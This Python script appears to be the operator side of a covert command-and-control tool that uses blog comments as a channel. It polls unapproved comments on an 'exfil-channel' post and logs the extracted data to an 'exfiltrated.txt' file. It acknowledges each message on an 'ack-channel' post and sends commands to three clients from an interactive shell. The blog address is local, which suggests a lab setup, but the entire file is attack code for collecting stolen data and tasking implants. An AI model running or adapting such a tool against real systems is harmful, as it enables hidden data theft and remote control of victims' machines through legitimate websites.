#!/usr/bin/env python3
from wpc2 import *
import cmd
import sys
import time
import datetime
import threading

server_id = sys.argv[1]
random.seed(int(datetime.datetime.now().timestamp()) + int(server_id))

channel = Channel()
channel.target_blog = "http://127.0.0.3/"
channel.exfil_channel = "2021/08/13/exfil-channel/"
channel.exfil_channel_id = 5
channel.ack_channel = "2021/08/13/ack-channel/"
channel.ack_channel_id = 7

recv_config = ReceiveConfig()
recv_config.recvr_id = server_id
recv_config.recv_time_slot = 30
recv_config.process_time_slot = 50
recv_config.prev_unapproved_index = 0

mtb_send_config= SendConfig()
mtb_send_config.sender_id = server_id
mtb_send_config.send_time_slot = 10
# mtb_send_config.confirm_time_slot = 30

class Client:
    id = ""
    time_slot = ""

clients = []
for i in range(1, 4):
    client = Client()
    client.id = str(i)
    clients.append(client)
    print("## Created client with id: " + str(client.id))

def ThreadStartListener():
    if recv_config.prev_unapproved_index == 0:
        recv_config.prev_unapproved_index = get_current_unapproved_index(channel)

    loop_counter = 99
    while(loop_counter > 0):
        received_data = receive_data(channel, len(clients), recv_config)
        recv_config.prev_unapproved_index = get_current_unapproved_index(channel)

        for exfil_content in received_data:
            to_write = str(datetime.datetime.utcnow()) + ": "
            to_write += "Extracted data with timeslot of " + str(recv_config.recv_time_slot) + ": " + exfil_content + "\n"
            print("[INFO] " + to_write);
            f = open("../output/exfiltrated.txt", "a")
            f.write(to_write)
            f.close()

            message_id = exfil_content.split(":")[0]
            print("[INFO] Extracted message_id is " + message_id)
            submit_comment(channel.target_blog, channel.ack_channel_id, message_id)

        loop_counter -= 1

threading.Thread(target=ThreadStartListener).start()
time.sleep(1)

class ServerShell(cmd.Cmd):
    intro = "Intro"
    prompt = ">> "

    def do_info(self, args):
        print("[INFO] Sending info command...")
        message = Message()
        message.message_id = generate_random_string(10)
        message.message = message.message_id + ": Info"
        send_data(channel, message, mtb_send_config)

ServerShell().cmdloop()
sys.exit()
